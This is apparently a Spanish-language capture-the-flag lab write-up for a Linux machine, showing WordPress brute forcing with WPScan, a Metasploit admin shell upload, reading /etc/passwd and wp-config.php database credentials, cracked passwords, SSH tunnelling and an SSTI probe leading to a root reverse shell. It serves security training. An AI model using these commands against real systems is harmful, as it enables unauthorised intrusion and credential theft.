# The First Avengers

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux explotando una instalación vulnerable de **WordPress**, obtener acceso inicial al sistema mediante una shell web, pivotar hasta un usuario válido a través de una base de datos MySQL y explotar una vulnerabilidad **Server-Side Template Injection (SSTI)** para conseguir acceso como **root**.

---

## 🛠️ Tecnologías trabajadas

- WordPress
- WPScan
- Metasploit
- MySQL
- SSH
- SSH Port Forwarding
- SSTI
- Feroxbuster

---

## 🧠 Metodología

La enumeración inicial reveló únicamente los servicios de **SSH** y **HTTP**, por lo que el punto de entrada más prometedor era la aplicación web. Tras identificar que el sitio utilizaba WordPress, el objetivo pasó a ser obtener acceso al panel de administración en lugar de buscar vulnerabilidades complejas desde el principio.

Una vez conseguida la autenticación, aproveché una funcionalidad conocida de Metasploit para obtener una shell inicial sobre el servidor. Sin embargo, en lugar de continuar trabajando desde un usuario con pocos privilegios, centré la investigación en localizar credenciales reutilizadas dentro de la instalación de WordPress.

El archivo `wp-config.php` proporcionó acceso a la base de datos, donde encontré información sensible que permitió comprometer un usuario del sistema y acceder mediante SSH. A partir de ese momento comenzó una nueva fase de enumeración interna.

Las técnicas habituales de escalada (`sudo`, binarios SUID, permisos especiales...) no ofrecieron resultados, por lo que decidí ampliar la enumeración revisando los servicios que únicamente estaban disponibles desde localhost. Esto permitió descubrir una aplicación web interna vulnerable a **Server-Side Template Injection (SSTI)**. Aprovechando dicha vulnerabilidad fue posible ejecutar comandos arbitrarios como **root**, completando así la explotación del laboratorio.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé identificando la dirección IP de la máquina mediante `arp-scan` y confirmé que se trataba de un sistema Linux gracias al TTL obtenido con `ping`.

Posteriormente utilicé **DogScan** para realizar la enumeración de puertos.

```bash
python3 dogscan.py 192.168.1.17
```

Se identificaron los siguientes servicios:

| Puerto | Servicio |
|---------|----------|
| 22 | SSH |
| 80 | HTTP |

---

### 2. Enumeración web

Al acceder a la página principal únicamente aparecía un sitio web muy básico, sin información útil ni pistas relevantes en el código fuente.

Realicé una enumeración inicial utilizando Gobuster.

```bash
gobuster dir -u http://192.168.1.17 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Los resultados indicaban claramente que el servidor utilizaba **WordPress**, aunque apenas aparecían directorios adicionales.

Para realizar una enumeración más completa utilicé Feroxbuster.

```bash
feroxbuster -u http://192.168.1.17 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Esta herramienta permitió descubrir varios recursos importantes:

- `/wp-admin`
- `/wp-content`
- `/wp-includes`
- `/wp-login.php`

---

### 3. Acceso al panel de WordPress

El primer intento consistió en utilizar las credenciales habituales:

```
admin:admin
```

Aunque la contraseña era incorrecta, WordPress confirmó que el usuario **admin** existía.

A continuación utilicé WPScan para realizar un ataque de fuerza bruta.

```bash
wpscan --url http://192.168.1.17/wp1 --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

El ataque devolvió las siguientes credenciales:

```
admin:spongebob
```

Con ellas inicié sesión correctamente en el panel de administración.

---

### 4. Obtención del acceso inicial

Una vez autenticado utilicé Metasploit para aprovechar el módulo específico de WordPress.

```text
msfconsole

search wp

use exploit/unix/webapp/wp_admin_shell_upload

run
```

El exploit permitió obtener una sesión de **Meterpreter**.

Para trabajar de una forma más cómoda abrí una reverse shell tradicional utilizando un listener en mi máquina atacante y enviando una conexión desde Meterpreter.

Tras ello realicé el tratamiento habitual de la TTY para disponer de una shell completamente interactiva.

Finalmente comprobé que el acceso inicial correspondía al usuario:

```
www-data
```

---

### 5. Enumeración interna

El primer paso fue revisar los usuarios existentes.

```bash
cat /etc/passwd
```

Durante esta enumeración apareció el usuario:

```
steve
```

Posteriormente revisé uno de los archivos más importantes en instalaciones WordPress.

```bash
cat /var/www/html/wp1/wp-config.php
```

Este archivo contenía las credenciales de acceso a MySQL.

Con ellas inicié sesión en la base de datos.

```bash
mysql -u wordpress -p
```

Tras explorar las bases de datos encontré una denominada:

```
top_secret
```

Dentro de ella aparecía una tabla llamada:

```
avengers
```

La información almacenada permitía obtener la contraseña del usuario **steve**.

Tras crackear el hash obtuve las credenciales:

```
steve:thecaptain
```

Con ellas inicié sesión mediante SSH.

```bash
ssh steve@192.168.1.17
```

Una vez autenticado localicé la primera flag:

```
user.txt
```

---

### 6. Escalada de privilegios

Comencé revisando los métodos habituales.

```bash
sudo -l
```

No existían permisos interesantes.

Posteriormente busqué binarios SUID.

```bash
find / -perm -4000 2>/dev/null
```

Ninguno de ellos era explotable.

Decidí ampliar la enumeración comprobando los puertos abiertos únicamente en localhost.

```bash
ss -tuln
```

Durante esta revisión apareció un servicio escuchando en el puerto:

```
7092
```

Para acceder a él desde mi equipo utilicé un túnel SSH.

```bash
ssh -L 7092:127.0.0.1:7092 steve@192.168.1.17
```

Una vez creado el túnel accedí desde el navegador a:

```
http://127.0.0.1:7092
```

La aplicación mostraba un formulario susceptible de ser vulnerable a **Server-Side Template Injection (SSTI)**.

Para comprobarlo utilicé una operación aritmética sencilla.

```text
{{7*7}}
```

El resultado confirmó que la plantilla era vulnerable.

Posteriormente utilicé un payload SSTI que ejecutaba una reverse shell hacia mi máquina atacante.

La conexión obtenida correspondía directamente al usuario:

```
root
```

Finalmente recuperé la última flag:

```
root.txt
```

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió reforzar la importancia de una buena enumeración durante todas las fases de una auditoría, especialmente después de obtener acceso inicial.
- Enumerar instalaciones WordPress utilizando varias herramientas complementarias.
- Aprovechar WPScan para obtener credenciales mediante fuerza bruta.
- Utilizar Metasploit para comprometer una instalación WordPress autenticada.
- Obtener credenciales reutilizadas revisando el archivo `wp-config.php`.
- Acceder y consultar bases de datos MySQL desde una shell comprometida.
- Comprender la utilidad de los túneles SSH para acceder a servicios internos.
- Detectar vulnerabilidades **Server-Side Template Injection (SSTI)** mediante payloads sencillos.
- Obtener ejecución remota de comandos aprovechando SSTI.
